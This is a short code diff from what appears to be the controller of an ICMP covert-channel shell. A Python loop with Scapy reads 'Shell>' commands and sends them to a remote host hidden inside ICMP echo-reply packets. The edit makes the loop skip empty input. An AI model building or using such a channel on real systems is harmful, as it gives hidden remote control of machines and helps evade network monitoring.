@@ -9,7 +9,7 @@ def send_packet(ipsrc):
             command = str(input("Shell> "))
             if command == "exit":
                 exit()
-            else:
+            if command:
                 ip_packet = IP(dst=ipsrc) / ICMP(id=10, type=0) / Raw(load=command)
                 send(ip_packet, verbose=0)
                 break
